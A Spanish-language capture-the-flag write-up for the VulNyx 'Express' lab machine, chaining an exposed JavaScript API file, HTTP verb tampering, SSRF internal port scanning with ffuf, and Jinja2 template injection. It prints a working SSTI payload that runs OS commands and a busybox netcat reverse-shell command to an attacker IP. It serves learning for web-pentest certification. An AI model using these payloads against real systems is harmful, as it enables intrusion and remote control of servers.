# Express — VulNyx (Write-up)

## Introducción

Muy buenas y bienvenidos a la resolución de la máquina **Express** de VulNyx. Esta es otra de las máquinas que hago para la plataforma; en este caso es una máquina muy útil para entender varias técnicas de **hacking web**. La recomiendo mucho para quienes quieran presentarse al **CBBH**.

A continuación, las técnicas que nos encontraremos. Vamos a poner todas las que hay, como si fuera un pentest:

- **Information Disclosure** — JavaScript File exposed
- **HTTP Verb Tampering** — API token disclosure
- **Server-Side Request Forgery (SSRF)** — Parameter `url`
    - Enumerating internal ports
- **Server-Side Template Injection (SSTI)** — Internal Server, parameter `name` → Remote Code Execution

---

## Enumeración básica

De primeras tenemos la IP de la máquina en el dashboard de la propia VM cuando la arrancamos. Pero si no fuera el caso, se puede enumerar la red para verla con herramientas como `fping`, `arp-scan` o el propio `nmap`.

Una vez tenemos la IP, hacemos un escaneo Nmap rápido:

```bash
sudo nmap -sCV -p- -T5 192.168.93.129 -oN scan
```

Por metodología, y al ser VulNyx, antes incluso de entrar al servidor web vamos a añadir `express.nyx` al `/etc/hosts` y entrar primero con la IP y después con el dominio, a ver si cambia algo la página.

- De primeras, con la **IP**, nos aparece el Apache básico.
- Si entramos a **`express.nyx`**, aparece una página totalmente distinta.

Al ser el creador de la página voy a ir directo al grano y no perder el tiempo con cosas que no tienen sentido. Es decir, me voy a centrar en explicar cada detalle mínimo, que es lo que puedo diferenciar respecto de otro writeup.

De acuerdo: te has encontrado con que la página no tiene subdominios, ni vhost, ni algo que sacar en el código fuente o haciendo fuzzing. La cosa es que quiero que cojáis como metodología entrar en la web, abrir las **DevTools (F12) → Network** y hacer un `F5` para ver qué carga la web. Muchas veces vais a encontrar cositas interesantes, y es una parte importante a la hora de hacer hacking web.

Vamos a hacerlo a ver qué encontramos.

---

## JavaScript API Disclosure

Hay un archivo JavaScript que parece que procesa una API. Vamos a entrar al archivo (`api.js`) a ver qué hay dentro:

```javascript
function getMusicList() {
    fetch('/api/music/list')
        .then(response => response.json())
        .then(data => {
            console.log('Music genre list:', data);
        })
        .catch(error => {
            console.error('Error fetching the music list:', error);
        });
}

function getMusicSongs() {
    fetch('/api/music/songs')
        .then(response => response.json())
        .then(data => {
            console.log('List of songs:', data);
        })
        .catch(error => {
            console.error('Error fetching the list of songs:', error);
        });
}

function getUsersWithKey() {
    fetch(`/api/users?key=${secretKey}`)
        .then(response => response.json())
        .then(data => {
            console.log('User list (with key):', data);
        })
        .catch(error => {
            console.error('Error fetching the user list:', error);
        });
}

function checkUrlAvailability() {
    const data = {
        id: 1,
        url: 'http://example.com',
        token: '1234-1234-1234'
    };

    fetch('/api/admin/availability', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log('URL status:', data);
    })
    .catch(error => {
        console.error('Error checking the URL availability:', error);
    });
}
```

El archivo `api.js` está mostrando endpoints de API que parecen procesar datos. Son los siguientes:

|Endpoint|Método|Parámetros|
|---|---|---|
|`/api/music/list`|`GET`|Ninguno|
|`/api/music/songs`|`GET`|Ninguno|
|`/api/users`|`GET`|`key`|
|`/api/admin/availability`|`POST`|`id`, `url`, `token`|

Tras analizar cómo funciona la página (así es como suelo tomar notas cuando me enfrento a lectura de código), ahora podemos hacer algo con ella. Empezamos por la primera API y vamos bajando, aunque más o menos ya se intuye cuál es la más interesante (`/api/admin/availability`). Esta tiene un parámetro `token`, así que seguramente está restringida la llamada con cierto token específico.

### /api/music/list

Empezamos llamando a `/api/music/list` a ver qué aparece. Duplicamos la web, llamamos a la API y capturamos con **BurpSuite** para trabajar más cómodos; lo mandamos al **Repeater**.

Simplemente se listan en JSON tipos/listas de música.

### /api/music/songs

Con `songs` vemos que muestra canciones en formato JSON.

### /api/users

Cuando llamamos a `/api/users` nos aparece otro mensaje. Recordamos que había un parámetro GET llamado `key`; vamos a ponerlo a ver qué nos dice:

```
/api/users?key=xerosecguapo
```

Nos sigue apareciendo `Unauthorized, wrong key!`. Eso quiere decir que para listar los usuarios es necesaria una key específica.

Y ahora te quedas pensando... ¿se tiene que hacer un fuzzing para buscar una key? Pero si no tenemos ninguna de ejemplo para saber caracteres, longitud... Tranquil@, porque **no va por ahí**. Antes de hacer fuzzing, cuando te encuentras con una restricción al realizar una petición:

> ¿Has pensado en qué otra opción tienes?

---

## HTTP Verb Tampering

Siempre, antes de nada, juega con los métodos de petición a ver si sucede algo diferente. Muchas veces un programador puede equivocarse y meter una restricción con una key (o algo parecido) para realizar la petición, pero solo la asigna para **un método** en vez de para cualquier petición. Así que... ¿y si ponemos `POST` en vez de `GET`?

¡Vaya! Ahora tenemos todos los usuarios y vemos que hay un parámetro `token`, que nos servirá para el siguiente endpoint.

La cosa es que cualquier token no nos servirá: tenemos que buscar uno con permisos elevados (**admin**). Buscamos bien y... tenemos a la poderosa Bug Bounty Hunter **JESSS**, que es administradora del sistema.

Cogemos su token y nos vamos a la siguiente API:

```
4493-3179-0912-0597
```

---

## /api/admin/availability

Cuando intentamos hacer la llamada con los 3 parámetros, la API nos comenta que tiene que ser `application/json`. La llamada tiene que ser de este tipo:

```json
{
  "id": 1,
  "url": "http://google.com",
  "token": "4493-3179-0912-0597"
}
```

Cuando mandamos la petición, nos indica que la comprobación de la URL ha sido exitosa y que está activa. ¿Qué sucede si no lo está, o si pongo un token erróneo?

- Con un **token inválido** → error de autorización.
- Con una **URL errónea** → error de comprobación.

---

## Server-Side Request Forgery (SSRF)

Aquí es cuando entra la vulnerabilidad **SSRF**. Sabiendo que el parámetro `url` comprueba URLs, ¿qué sucede si ponemos un listener esperando una petición y apuntamos la URL hacia nosotros?

```bash
nc -lvnp 4444
# url --> nuestra IP:4444
```

Apuntamos a nuestra IP y **recibimos la petición**. Eso quiere decir que el parámetro es vulnerable a SSRF. Ahora nos preguntamos: ¿qué podemos hacer?

Hay varias opciones, pero la primera que debe venir a la mente es realizar un **escaneo de puertos interno** de la máquina Express, para ver si hay otro servidor interno corriendo. Esto lo haremos con `ffuf` (se puede hacer con varias herramientas).

### Enumerando puertos internos

Antes de ejecutar `ffuf`, creamos con `seq` un listado de puertos, del 1 al 10000:

```bash
seq 1 10000 > ports.txt
```

Después ejecutamos:

```bash
ffuf -w ./ports.txt -u http://express.nyx/api/admin/availability -X POST \
  -H "Content-Type: application/json" \
  -d '{"id": 123, "url": "http://127.0.0.1:FUZZ", "token": "4493-3179-0912-0597"}'
```

Cuando ejecutamos, nos aparece el típico size repetido. En este caso filtramos por _words_ con `-fw 36`:

```bash
ffuf -w ./ports.txt -u http://express.nyx/api/admin/availability -X POST \
  -H "Content-Type: application/json" \
  -d '{"id": 123, "url": "http://127.0.0.1:FUZZ", "token": "4493-3179-0912-0597"}' \
  -fw 36
```

Encontramos 2 puertos que no conocíamos: **5000** y **9000**.

Os adelanto que el **5000** es el que está corriendo las APIs (internamente hice un proxy para poder hacer las peticiones a través del 80), así que ese ya lo podíamos alcanzar por el 80. El importante es el **9000**.

Llamamos a `http://127.0.0.1:9000` mediante el parámetro `url` a ver qué nos muestra. Si limpiamos bien lo que aparece en `response_data`, vemos que es simplemente un servidor web que realiza la petición con `GET` a la ruta `/username` con el parámetro `name`:

```html
<form method="get" action="/username">
    <input type="text" name="name" placeholder="Enter your name">
    <input type="submit" value="Greet">
</form>
```

Es decir, sería algo así:

```
http://127.0.0.1:9000/username?name=blabla
```

Veamos qué pasa si lo ponemos de esa manera... ¿Y qué vulnerabilidad habrá en este campo?

---

## Server-Side Template Injection (SSTI)

Aquí es cuando entra el **SSTI**, una vulnerabilidad que se comprueba aplicando fórmulas matemáticas para saber si el campo es vulnerable o no. Para ello vamos a utilizar mi checklist.

Tenemos payloads básicos para probar y luego metodología para detectar el framework usado por detrás:

```
{7*7}
${7*7}
{{7*'7'}}
#{7*7}
%{7*7}
{{7*7}}
```

Empezamos con el más avanzado: `{{7*7}}`. Se ve perfectamente que lo detecta, saliendo un **49**. Siguiendo la metodología:

- Si responde con **49**, significa que es vulnerable, ya que reconoció la expresión.
- Si ponemos `{{7*'7'}}` para detectar si es **Jinja2** o **Twig**:
    - Si sale `7777777` → es **Jinja2**.
    - Si sale `49` → es **Twig**.

Ponemos `{{7*'7'}}` para saber cuál es y así coger payloads específicos del framework correcto. Sabemos que nos estamos enfrentando a **Jinja2**.

Utilizamos el siguiente payload para conseguir ejecución remota de comandos:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
Somos **root**.

Utilizamos `busybox` para mandarnos una reverse shell:
```bash
busybox nc 192.168.93.128 4444 -e bash
```

¡La recibimos!

---

_Write-up de la máquina **Express** — VulNyx · Recomendada para preparación del CBBH._